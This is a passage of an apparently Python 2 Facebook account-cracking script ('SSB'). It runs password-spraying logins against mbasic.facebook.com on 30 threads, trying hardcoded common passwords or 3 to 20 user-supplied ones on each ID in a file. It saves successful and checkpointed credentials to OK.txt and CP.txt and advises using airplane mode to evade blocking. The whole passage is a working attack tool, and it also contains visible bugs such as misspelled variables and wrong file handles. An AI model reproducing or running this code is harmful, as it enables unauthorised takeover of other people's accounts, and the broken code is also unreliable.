																																																			cps.append(uid+ps24)
																																																		else:
																																																			ps25 = 'khan123456'
																																																			data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps25, 'login': 'submit'})
																																																			sp = data.content
																																																			if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																																				print(' \x1b[1;92m [SSB-OK] '+uid+' | '+ps25+'\033[0;97m')
																																																				ok = open('OK.txt', 'a')
																																																				ok.write(uid+'|'+ps25+'\n')
																																																				ok.close()
																																																				oks.append(uid+ps25)
																																																			else:
																																																				if 'checkpoint' in sp:
																																																					print(' \x1b[1;91m [SSB-CP] '+uid+' | '+ps25+'\033[0;97m')
																																																					cp = open('CP.txt', 'a')
																																																					cp.write(uid+'|'+ps25+'\n')
																																																					cp.close()
																																																					cps.append(uid+ps25)
																																																				else:
																																																					ps26 = 'khan123'
																																																					data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps26, 'login': 'submit'})
																																																					sp = data.content
																																																					if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																																						print(' \x1b[1;92m [SSB-OK] '+uid+' | '+ps26+'\033[0;97m')
																																																						ok = open('OK.txt', 'a')
																																																						ok.write(uid+'|'+ps26+'\n')
																																																						ok.close()
																																																						oks.append(uid+ps26)
																																																					else:
																																																						if 'checkpoint' in sp:
																																																							print(' \x1b[1;91m [SSB-CP] '+uid+' | '+ps26+'\033[0;97m')
																																																							cp = open('CP.txt', 'a')
																																																							cp.write(uid+'|'+ps26+'\n')
																																																							cp.close()
																																																							cps.append(uid+ps26)
																																																						else:
																																																							ps27 = 'pakistan111'
																																																							data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps27, 'login': 'submit'})
																																																							sp = data.content
																																																							if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																																								print(' \x1b[1;92m [SSB-OK] '+uid+' | '+ps27+'\033[0;97m')
																																																								ok = open('OK.txt', 'a')
																																																								ok.write(uid+'|'+ps27+'\n')
																																																								ok.close()
																																																								oks.append(uid+ps27)
																																																							else:
																																																								if 'checkpoint' in sp:
																																																									print(' \x1b[1;91m [SSB-CP] '+uid+' | '+ps27+'\033[0;97m')
																																																									cp = open('CP.txt', 'a')
																																																									cp.write(uid+'|'+ps27+'\n')
																																																									cp.close()
																																																									cps.append(uid+ps27)
																																																								else:
																																																									ps28 = 'khan1235'
																																																									data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps28, 'login': 'submit'})
																																																									sp = data.content
																																																									if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																																										print(' \x1b[1;92m [SSB-OK] '+uid+' | '+ps28+'\033[0;97m')
																																																										ok = open('OK.txt', 'a')
																																																										ok.write(uid+'|'+ps28+'\n')
																																																										ok.close()
																																																										oks.append(uid+ps28)
																																																									else:
																																																										if 'checkpoint' in sp:
																																																											print(' \x1b[1;91m [SSB-CP] '+uid+' | '+ps28+'\033[0;97m')
																																																											cp = open('CP.txt', 'a')
																																																											cp.write(uid+'|'+ps28+'\n')
																																																											cp.close()
																																																											cps.append(uid+ps28)
																																																										else:
																																																											ps29 = '887766'
																																																											data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps29, 'login': 'submit'})
																																																											sp = data.content
																																																											if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																																												print(' \x1b[1;92m [SSB-OK] '+uid+' | '+ps29+'\033[0;97m')
																																																												ok = open('OK.txt', 'a')
																																																												ok.write(uid+'|'+pz29+'\n')
																																																												ok.close()
																																																												oks.append(uid+ps29)
																																																											else:
																																																												if 'checkpoint' in sp:
																																																													print(' \x1b[1;91m [SSB-CP] '+uid+' | '+ps29+'\033[0;97m')
																																																													cp = open('CP.txt', 'a')
																																																													cp.write(uid+'|'+ps29+'\n')
																																																													ok.close()
																																																													cps.append(uid+ps29)
																																																												else:
																																																													ps30 = '123786'
																																																													data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps30, 'login': 'submit'})
																																																													sp = data.content
																																																													if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																																														print(' \x1b[1;92m [SSB-OK] '+uid+' | '+ps30+'\033[0;97m')
																																																														ok = open('OK.txt', 'a')
																																																														ok.write(uid+'|'+ps30+'\n')
																																																														ok.close()
																																																														oks.append(uid+ps30)
																																																													else:
																																																														if 'checkpoint' in sp:
																																																															print(' \x1b[1;91m [SSB-CP] '+uid+' | '+ps30+'\033[0;97m')
																																																															cp = open('CP.txt', 'a')
																																																															cp.write(uid+'|'+ps30+'\n')
																																																															cp.close()
																																																															cps.append(uid+ps30)
																																																														else:
																																																															pz31 = '110786'
																																																															data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps31, 'login': 'submit'})
																																																															sp = data.content
																																																															if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																																																print(' \x1b[1;92m [SSB-OK] '+uid+' | '+ps31+'\033[0;97m')
																																																																ok = open('OK.txt', 'a')
																																																																ok.write(uid+'|'+ps31+'\n')
																																																																ok.close()
																																																																oks.append(uid+ps31)
																																																															else:
																																																																if 'checkpoint' in sp:
																																																																	print(' \x1b[1;91m [SSB-CP] '+uid+' | '+ps31+'\033[0;97m')
																																																																	cp = open('CP.txt', 'a')
																																																																	cp.write(uid+'|'+ps31+'\n')
																																																																	ok.close()
																																																																	cps.append(uid+ps31)
																																																																else:
																																																																	ps32 = '110110'
																																																																	data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps32, 'login': 'submit'})
																																																																	sp = data.content
																																																																	if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																																																		print(' \x1b[1;92m [SSB-OK] '+uid+' | '+ps32+'\033[0;97m')
																																																																		ok = open('OK.txt', 'a')
																																																																		ok.write(uid+'|'+ps32+'\n')
																																																																		ok.close()
																																																																		cps.append(uid+ps32)
																																																																	else:
																																																																		if 'checkpoint' in sp:
																																																																			print(' \x1b[1;91m [SSB-CP] '+uid+' | '+ps32+'\033[0;97m')
																																																																			cp = open('CP.txt', 'a')
																																																																			cp.write(uid+'|'+ps32+'\n')
																																																																			ok.close()
																																																																			cps.append(uid+ps32)
																																																																		else:
																																																																			ps33 = '786123'
																																																																			data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps33, 'login': 'submit'})
																																																																			sp = data.content
																																																																			if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																																																				print(' \x1b[1;92m [SSB-CP] '+uid+' | '+ps33+'\033[0;97m')
																																																																				ok = open('OK.txt', 'a')
																																																																				ok.write(uid+'|'+ps33+'\n')
																																																																				ok.close()
																																																																				oks.append(uid+ps33)
																																																																			else:
																																																																				if 'checkpoint' in sp:
																																																																					print(' \x1b[1;91m [SSB-CP] '+uid+' | '+ps33+'\033[0;97m')
																																																																					cp = open('CP.txt', 'a')
																																																																					cp.write(uid+'|'+ps33+'\n')
																																																																					cp.close()
																																																																					cps.append(uid+ps33)
																																																																				else:
																																																																					ps34 = '786110'
																																																																					data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps34, 'login': 'submit'})
																																																																					sp = data.content
																																																																					if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																																																						print(' \x1b[1;92m [SSB-OK] '+uid+' | '+ps34+'\033[0;97m')
																																																																						ok = open('OK.txt', 'a')
																																																																						ok.write(uid+'|'+ps34+'\n')
																																																																						ok.close()
																																																																						oks.append(uid+ps34)
																																																																					else:
																																																																						if 'checkpoint' in sp:
																																																																							print(' \x1b[1;91m [SSB-CP] '+uid+' | '+ps34+'\033[0;97m')
																																																																							cp = open('CP.txt', 'a')
																																																																							cp.write(uid+'|'+ps34+'\n')
																																																																							cp.close()
																																																																							cps.append(uid+ps34)
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print("\x1b[1;97m------------------------\x1b[1;97m------------------------")
	print ("\x1b[1;91m[!]\x1b[1;97mProcess has been complete")
	print ("\x1b[1;91m[!]\x1b[1;97mTotal OK  "+str(len(oks)))
	print ("\x1b[1;91m[!]\x1b[1;97mTotal CP  "+str(len(cps)))
	print("\x1b[1;97m------------------------\x1b[1;97m------------------------")
	raw_input("\x1b[1;97mPress enter to back SSB Menu ")
	menu()
def choice():
	os.system("clear")
	print(logo)
	print("\x1b[1;97m-----------------------------------------------------")
	print("\x1b[1;91m [1]\x1b[1;97m Crack File \x1b[1;90m   [3  Pass]")
	print("\x1b[1;91m [2]\x1b[1;97m Crack File \x1b[1;90m   [5  Pass]")
	print("\x1b[1;91m [3]\x1b[1;97m Crack File \x1b[1;90m   [7  Pass]")
	print("\x1b[1;91m [4]\x1b[1;97m Crack File \x1b[1;90m   [10 Pass]")
	print("\x1b[1;91m [5]\x1b[1;97m Crack File \x1b[1;90m   [20 Pass] ")
	print("\x1b[1;91m [0]\x1b[1;97m Back")
	print("\x1b[1;97m-----------------------------------------------------")
	choice_select()
def choice_select():
	select = raw_input("\x1b[1;97mChoose ---> ")
	id=[]
	oks=[]
	cps=[]
	if select =="1":
		os.system("clear")
		print(logo)
		ps = raw_input("\033[1;91m[!]\x1b[1;97m Password1: ")
		ps2 = raw_input("\033[1;91m[!]\x1b[1;97m Password2: ")
		ps3 = raw_input("\033[1;91m[!]\x1b[1;97m Password3: ")
		filelist = raw_input("\x1b[1;91m[!]\x1b[1;97m File : \x1b[1;97m")
		try:
			for line in open(filelist , "r").readlines():
			    id.append(line.strip())
		except (KeyError,IOError):
			print("")
			print("\t    \033[1;37mRequested file not found\033[0;97m")
			print("")
			raw_input(" Press enter to back ")
			choice()
	elif select =="2":
		os.system("clear")
		print(logo)
		ps = raw_input("\033[1;91m[!]\x1b[1;97m Password1: ")
		ps2 = raw_input("\033[1;91m[!]\x1b[1;97m Password2: ")
		ps3 = raw_input("\033[1;91m[!]\x1b[1;97m Password3: ")
		ps4 = raw_input("\033[1;91m[!]\x1b[1;97m Password4: ")
		ps5 = raw_input("\033[1;91m[!]\x1b[1;97m Password5: ")
		filelist = raw_input("\x1b[1;91m[!]\x1b[1;97m File : \x1b[1;97m")
		try:
			for line in open(filelist , "r").readlines():
			    id.append(line.strip())
		except (KeyError,IOError):
			print("")
			print("\t    \033[1;37mRequested file not found\033[0;97m")
			print("")
			raw_input(" Press enter to back ")
			choice()
	elif select =="3":
		os.system("clear")
		print(logo)
		ps = raw_input("\033[1;91m[!]\x1b[1;97m Password1: ")
		ps2 = raw_input("\033[1;91m[!]\x1b[1;97m Password2: ")
		ps3 = raw_input("\033[1;91m[!]\x1b[1;97m Password3: ")
		ps4 = raw_input("\033[1;91m[!]\x1b[1;97m Password4: ")
		ps5 = raw_input("\033[1;91m[!]\x1b[1;97m Password5: ")
		ps6 = raw_input("\033[1;91m[!]\x1b[1;97m Password6: ")
		ps7 = raw_input("\033[1;91m[!]\x1b[1;97m Password7: ")
		filelist = raw_input("\x1b[1;91m[!]\x1b[1;97m File : \x1b[1;97m")
		try:
			for line in open(filelist , "r").readlines():
			    id.append(line.strip())
		except (KeyError,IOError):
			print("")
			print("\t    \033[1;37mRequested file not found\033[0;97m")
			print("")
			raw_input(" Press enter to back ")
			choice()
	elif select =="4":
		os.system("clear")
		print(logo)
		ps = raw_input("\033[1;91m[!]\x1b[1;97m Password1: ")
		ps2 = raw_input("\033[1;91m[!]\x1b[1;97m Password2: ")
		ps3 = raw_input("\033[1;91m[!]\x1b[1;97m Password3: ")
		ps4 = raw_input("\033[1;91m[!]\x1b[1;97m Password4: ")
		ps5 = raw_input("\033[1;91m[!]\x1b[1;97m Password5: ")
		ps6 = raw_input("\033[1;91m[!]\x1b[1;97m Password6: ")
		ps7 = raw_input("\033[1;91m[!]\x1b[1;97m Password7: ")
		ps8 = raw_input("\033[1;91m[!]\x1b[1;97m Password8: ")
		ps9 = raw_input("\033[1;91m[!]\x1b[1;97m Password9: ")
		ps10 = raw_input("\033[1;91m[!]\x1b[1;97m Password10: ")
		filelist = raw_input("\x1b[1;91m[!]\x1b[1;97m File : \x1b[1;97m")
		try:
			for line in open(filelist , "r").readlines():
			    id.append(line.strip())
		except (KeyError,IOError):
			print("")
			print("\t    \033[1;37mRequested file not found\033[0;97m")
			print("")
			raw_input(" Press enter to back ")
			choice()
	elif select =="5":
		os.system("clear")
		print(logo)
		ps = raw_input("\033[1;91m[!]\x1b[1;97m Password1: ")
		ps2 = raw_input("\033[1;91m[!]\x1b[1;97m Password2: ")
		ps3 = raw_input("\033[1;91m[!]\x1b[1;97m Password3: ")
		ps4 = raw_input("\033[1;91m[!]\x1b[1;97m Password4: ")
		ps5 = raw_input("\033[1;91m[!]\x1b[1;97m Password5: ")
		ps6 = raw_input("\033[1;91m[!]\x1b[1;97m Password6: ")
		ps7 = raw_input("\033[1;91m[!]\x1b[1;97m Password7: ")
		ps8 = raw_input("\033[1;91m[!]\x1b[1;97m Password8: ")
		ps9 = raw_input("\033[1;91m[!]\x1b[1;97m Password9: ")
		ps10 = raw_input("\033[1;91m[!]\x1b[1;97m Password10: ")
		ps11 = raw_input("\033[1;91m[!]\x1b[1;97m Password11: ")
		ps12 = raw_input("\033[1;91m[!]\x1b[1;97m Password12: ")
		ps13 = raw_input("\033[1;91m[!]\x1b[1;97m Password13: ")
		ps14 = raw_input("\033[1;91m[!]\x1b[1;97m Password14: ")
		ps15 = raw_input("\033[1;91m[!]\x1b[1;97m Password15: ")
		ps16 = raw_input("\033[1;91m[!]\x1b[1;97m Password16: ")
		ps17 = raw_input("\033[1;91m[!]\x1b[1;97m Password17: ")
		ps18 = raw_input("\033[1;91m[!]\x1b[1;97m Password18: ")
		ps19 = raw_input("\033[1;91m[!]\x1b[1;97m Password19: ")
		ps20 = raw_input("\033[1;91m[!]\x1b[1;97m Password20: ")
		filelist = raw_input("\x1b[1;91m[!]\x1b[1;97m File : \x1b[1;97m")
		try:
			for line in open(filelist , "r").readlines():
			    id.append(line.strip())
		except (KeyError,IOError):
			print("")
			print("\t    \033[1;37mRequested file not found\033[0;97m")
			print("")
			raw_input(" Press enter to back ")
			choice()
	elif select =="0":
	    menu()
	else:
		print("\tSelect valid option\033[0;97m")
		choice_select()
	print("\x1b[1;97m--------------------------------------------------------")
	print(" \x1b[1;91m     Use flight (airplane) mode before use")
	print("\x1b[1;97m----------------------------------------------------------")
	print''
	print(" \x1b[1;97m               Total idz :\x1b[1;92m "+str(len(id)))
	print("\x1b[1;97m----------------------------------------------------")
	print(" \x1b[1;93m        Please Wait Cloning started...")
	print("\x1b[1;97m-----------------------------------------------------")
	def main(arg):
		user=arg
		uid,name=user.split("|")
		sharagent = random.choice(us)
		session = requests.Session()
		session.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":sharagent,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
		host="https://mbasic.facebook.com"
		try:
			data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps, 'login': 'submit'})
			sp = data.content
			if 'mbasic_logout_button' in sp or 'save-device' in sp:
				print(' \x1b[1;92m [SSB-OK] '+uid+' | '+ps+'\033[0;97m')
				ok = open('OK.txt', 'a')
				ok.write(uid+'|'+ps+'\n')
				ok.close()
				oks.append(uid+ps)
			else:
				if 'checkpoint' in sp:
					print(' \x1b[1;91m [SSB-CP] '+uid+' | '+ps+'\033[0;97m')
					cp = open('CP.txt', 'a')
					cp.write(uid+'|'+ps+'\n')
					cp.close()
					cps.append(uid+ps)
				else:
					data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps2, 'login': 'submit'})
					sp = data.content
					if 'mbasic_logout_button' in sp or 'save-device' in sp:
						print(' \x1b[1;92m [SSB-OK] '+uid+' | '+ps2+'\033[0;97m')
						ok = open('OK.txt', 'a')
						ok.write(uid+'|'+ps2+'\n')
						ok.close()
						oks.append(uid+ps2)
					else:
						if 'checkpoint' in sp:
							print(' \x1b[1;91m [SSB-CP] '+uid+' | '+ps2+'\033[0;97m')
							cp = open('CP.txt', 'a')
							cp.write(uid+'|'+ps2+'\n')
							cp.close()
							cps.append(uid+ps2)
						else:
							data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps3, 'login': 'submit'})
							sp = data.content
							if 'mbasic_logout_button' in sp or 'save-device' in sp:
								print(' \x1b[1;92m [SSB-OK] '+uid+' | '+ps3+'\033[0;97m')
								ok = open('OK.txt', 'a')
								ok.write(uid+'|'+ps3+'\n')
								ok.close()
								oks.append(uid+ps3)
							else:
								if 'checkpoint' in sp:
									print(' \x1b[1;91m [SSB-CP] '+uid+' | '+ps3+'\033[0;97m')
									cp = open('CP.txt', 'a')
									cp.write(uid+'|'+ps3+'\n')
									cp.close()
									cps.append(uid+ps3)
								else:
									data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps4, 'login': 'submit'})
									sp = data.content
									if 'mbasic_logout_button' in sp or 'save-device' in sp:
										print(' \x1b[1;92m [SSB-OK] '+uid+' | '+ps4+'\033[0;97m')
										ok = open('OK.txt', 'a')
										ok.write(uid+'|'+ps4+'\n')
										ok.close()
										oks.append(uid+ps4)
									else:
										if 'checkpoint' in sp:
											print(' \x1b[1;91m [SSB-CP] '+uid+' | '+ps4+'\033[0;97m')
											cp = open('CP.txt', 'a')
											cp.write(uid+'|'+ps4+'\n')
											cp.close()
											cps.append(uid+ps4)
										else:
											data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps5, 'login': 'submit'})
											sp = data.content
											if 'mbasic_logout_button' in sp or 'save-device' in sp:
												print(' \x1b[1;92m [SSB-OK] '+uid+' | '+ps5+'\033[0;97m')
												ok = open('OK.txt', 'a')
												ok.write(uid+'|'+ps5+'\n')
												ok.close()
												oks.append(uid+ps5)
											else:
												if 'checkpoint' in sp:
													print(' \x1b[1;91m [SSB-CP] '+uid+' | '+ps5+'\033[0;97m')
													cp = open('CP.txt', 'a')
													cp.write(uid+'|'+ps5+'\n')
													cp.close()
													cps.append(uid+ps5)
												else:
													data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps6, 'login': 'submit'})
													sp = data.content
													if 'mbasic_logout_button' in sp or 'save-device' in sp:
														print(' \x1b[1;92m [SSB-OK] '+uid+' | '+ps6+'\033[0;97m')
														ok = open('OK.txt', 'a')
														ok.write(uid+'|'+ps6+'\n')
														ok.close()
														oks.append(uid+ps6)
													else:
														if 'checkpoint' in sp:
															print(' \033[1;91m [SSB-CP] '+uid+' | '+ps6+'\033[0;97m')
															cp = open('CP.txt', 'a')
															cp.write(uid+'|'+ps6+'\n')
															cp.close()
															cps.append(uid+ps6)
														else:
															data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps7, 'login': 'submit'})
															sp = data.content
															if 'mbasic_logout_button' in sp or 'save-device' in sp:
																print(' \x1b[1;92m [SSB-OK] '+uid+' | '+ps7+'\033[0;97m')
																ok = open('OK.txt', 'a')
																ok.write(uid+'|'+ps7+'\n')
																ok.close()
																oks.append(uid+ps7)
															else:
																if 'checkpoint' in sp:
																	print(' \x1b[1;91m [SSB-CP] '+uid+' | '+ps7+'\033[0;97m')
																	cp = open('CP.txt', 'a')
																	cp.write(uid+'|'+ps7+'\n')
																	cp.close()
																	cps.append(uid+ps7)
																else:
																	data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps8, 'login': 'submit'})
																	sp = data.content
																	if 'mbasic_logout_button' in sp or 'save-device' in sp:
																		print(' \x1b[1;92m [SSB-OK] '+uid+' | '+ps8+'\033[0;97m')
																		ok = open('OK.txt', 'a')
																		ok.write(uid+'|'+ps8+'\n')
																		ok.close()
																		oks.append(uid+ps8)
																	else:
																		if 'checkpoint' in sp:
																			print(' \x1b[1;91m [SSB-CP] '+uid+' | '+ps8+'\033[0;97m')
																			cp = open('CP.txt', 'a')
																			cp.write(uid+'|'+ps8+'\n')
																			cp.close()
																			cps.append(uid+ps8)
																		else:
																			data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps9, 'login': 'submit'})
																			sp = data.content
																			if 'mbasic_logout_button' in sp or 'save-device' in sp:
																				print(' \x1b[1;92m [SSB-OK] '+uid+' | '+ps9+'\033[0;97m')
																				ok = open('OK.txt', 'a')
																				ok.write(uid+'|'+ps9+'\n')
																				ok.close()
																				oks.append(uid+ps9)
																			else:
																				if 'checkpoint' in sp:
																					print(' \x1b[1;91m [SSB-CP] '+uid+' | '+ps9+'\033[0;97m')
																					cp = open('CP.txt', 'a')
																					cp.write(uid+'|'+ps9+'\n')
																					cp.close()
																					cps.append(uid+ps9)
																				else:
																					data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps10, 'login': 'submit'})
																					sp = data.content
																					if 'mbasic_logout_button' in sp or 'save-device' in sp:
																						print(' \x1b[1;92m [SSB-OK] '+uid+' | '+ps10+'\033[0;97m')
																						ok = open('OK.txt', 'a')
																						ok.write(uid+'|'+ps10+'\n')
																						ok.close()
																						oks.append(uid+ps10)
																					else:
																						if 'checkpoint' in sp:
																							print(' \x1b[1;91m [SSB-CP] '+uid+' | '+ps10+'\033[0;97m')
																							cp = open('CP.txt', 'a')
																							cp.write(uid+'|'+ps10+'\n')
																							cp.close()
																							cps.append(uid+ps10)
																						else:
																							data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps11, 'login': 'submit'})
																							sp = data.content
																							if 'mbasic_logout_button' in sp or 'save-device' in sp:
																								print(' \x1b[1;92m [SSB-OK] '+uid+' | '+ps11+'\033[0;97m')
																								ok = open('OK.txt', 'a')
																								ok.write(uid+'|'+ps11+'\n')
																								ok.close()
																								oks.append(uid+ps11)
																							else:
																								if 'checkpoint' in sp:
																									print(' \x1b[1;91m [SSB-CP] '+uid+' | '+ps11+'\033[0;97m')
																									cp = open('CP.txt', 'a')
																									cp.write(uid+'|'+ps11+'\n')
																									cp.close()
																									cps.append(uid+ps11)
																								else:
																									data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps12, 'login': 'submit'})
																									sp = data.content
																									if 'mbasic_logout_button' in sp or 'save-device' in sp:
																										print(' \x1b[1;91m [SSB-OK] '+uid+' | '+ps12+'\033[0;97m')
																										ok = open('OK.txt', 'a')
																										ok.write(uid+'|'+ps12+'\n')
																										ok.close()
																										oks.append(uid+ps12)
																									else:
																										if 'checkpoint' in sp:
																											print(' \x1b[1;91m [SSB-CP] '+uid+' | '+ps12+'\033[0;97m')
																											cp = open('CP.txt', 'a')
																											cp.write(uid+'|'+ps12+'\n')
																											cp.close()
																											cps.append(uid+ps12)
																										else:
																											data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps13, 'login': 'submit'})
																											sp = data.content
																											if 'mbasic_logout_button' in sp or 'save-device' in sp:
																												print(' \x1b[1;92m [SSB-OK] '+uid+' | '+ps13+'\033[0;97m')
																												ok = open('OK.txt', 'a')
																												ok.write(uid+'|'+ps13+'\n')
																												ok.close()
																												oks.append(uid+ps13)
																											else:
																												if 'checkpoint' in sp:
																													print(' \033[1;91m [SSB-CP] '+uid+' | '+ps13+'\033[0;97m')
																													cp = open('CP.txt', 'a')
																													cp.write(uid+'|'+ps13+'\n')
																													cp.close()
																													cps.append(uid+ps13)
																												else:
																													data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps14, 'login': 'submit'})
																													sp = data.content
																													if 'mbasic_logout_button' in sp or 'save-device' in sp:
																														print(' \x1b[1;92m [SSB-OK] '+uid+' | '+ps14+'\033[0;97m')
																														ok = open('OK.txt', 'a')
																														ok.write(uid+'|'+ps14+'\n')
																														ok.close()
																														oks.append(uid+ps14)
																													else:
																														if 'checkpoint' in sp:
																															print(' \x1b[1;91m [SSB-CP] '+uid+' | '+ps14+'\033[0;97m')
																															cp = open('CP.txt', 'a')
																															cp.write(uid+'|'+ps14+'\n')
																															cp.close()
																															cps.append(uid+ps14)
																														else:
																															data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps15, 'login': 'submit'})
																															sp = data.content
																															if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																print(' \x1b[1;91m [SSB-OK] '+uid+' | '+ps15+'\033[0;97m')
																																ok = open('OK.txt', 'a')
																																ok.write(uid+'|'+ps15+'\n')
																																ok.close()
																																oks.append(uid+ps15)
																															else:
																																if 'checkpoint' in sp:
																																	print(' \x1b[1;91m [SSB-CP] '+uid+' | '+ps15+'\033[0;97m')
																																	cp = open('CP.txt', 'a')
																																	cp.write(uid+'|'+ps15+'\n')
																																	cp.close()
																																	cps.append(uid+ps15)
																																else:
																																	data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps16, 'login': 'submit'})
																																	sp = data.content
																																	if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																		print(' \x1b[1;92m [SSB-OK] '+uid+' | '+ps16+'\033[0;97m')
																																		ok = open('OK.txt', 'a')
																																		ok.write(uid+'|'+ps16+'\n')
																																		ok.close()
																																		oks.append(uid+ps16)
																																	else:
																																		if 'checkpoint' in sp:
																																			print(' \x1b[1;91m [SSB-CP] '+uid+' | '+ps16+'\033[0;97m')
																																			cp = open('CP.txt', 'a')
																																			cp.write(uid+'|'+ps16+'\n')
																																			cp.close()
																																			cps.append(uid+ps16)
																																		else:
																																			data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps17, 'login': 'submit'})
																																			sp = data.content
																																			if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																				print(' \x1b[1;92m [SSB-OK] '+uid+' | '+ps17+'\033[0;97m')
																																				ok = open('OK.txt', 'a')
																																				ok.write(uid+'|'+ps17+'\n')
																																				ok.close()
																																				oks.append(uid+ps17)
																																			else:
																																				if 'checkpoint' in sp:
																																					print(' \x1b[1;91m [SSB-CP] '+uid+' | '+ps17+'\033[0;97m')
																																					cp = open('CP.txt', 'a')
																																					cp.write(uid+'|'+ps17+'\n')
																																					cp.close()
																																					cps.append(uid+ps17)
																																				else:
																																					data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps18, 'login': 'submit'})
																																					sp = data.content
																																					if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																						print(' \x1b[1;91m [SSB-OK] '+uid+' | '+ps18+'\033[0;97m')
																																						ok = open('OK.txt', 'a')
																																						ok.write(uid+'|'+ps18+'\n')
																																						ok.close()
																																						oks.append(uid+ps18)
																																					else:
																																						if 'checkpoint' in sp:
																																							print(' \x1b[1;91m [SSB-CP] '+uid+' | '+ps18+'\033[0;97m')
																																							cp = open('CP.txt', 'a')
																																							cp.write(uid+'|'+ps18+'\n')
																																							cp.close()
																																							cps.append(uid+ps18)
																																						else:
																																							data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps19, 'login': 'submit'})
																																							sp = data.content
																																							if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																								print(' \x1b[1;92m [SSB-OK] '+uid+' | '+ps19+'\033[0;97m')
																																								ok = open('OK.txt', 'a')
																																								ok.write(uid+'|'+ps19+'\n')
																																								ok.close()
																																								oks.append(uid+ps19)
																																							else:
																																								if 'checkpoint' in sp:
																																									print(' \x1b[1;91m [SSB-CP] '+uid+' | '+ps19+'\033[0;97m')
																																									cp = open('CP.txt', 'a')
																																									cp.write(uid+'|'+ps19+'\n')
																																									cp.close()
																																									cps.append(uid+ps19)
																																								else:
																																									data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps20, 'login': 'submit'})
																																									sp = data.content
																																									if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																										print(' \x1b[1;92m [SSB-OK] '+uid+' | '+ps20+'\033[0;97m')
																																										ok = open('OK.txt', 'a')
																																										ok.write(uid+'|'+ps20+'\n')
																																										ok.close()
																																										oks.append(uid+ps20)
																																									else:
																																										if 'checkpoint' in sp:
																																											print(' \x1b[1;91m [SSB-CP] '+uid+' | '+ps20+'\033[0;97m')
																																											cp = open('CP.txt', 'a')
																																											cp.write(uid+'|'+ps20+'\n')
																																											cp.close()
																																											cps.append(uid+ps20)
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print("\x1b[1;97m-----------------------------------------------------")
	print ("\x1b[1;91m[!]\x1b[1;97mProcess has been complete")
	print ("\x1b[1;91m[!]\x1b[1;97mTotal OK  "+str(len(oks)))
	print ("\x1b[1;91m[!]\x1b[1;97mTotal CP  "+str(len(cps)))
	print("\x1b[1;97m-----------------------------------------------------")
	raw_input("\x1b[1;91m[!]\x1b[1;97mPress enter to back SSB Menu ")
	menu()
	
	
if __name__ == '__main__':
	main()
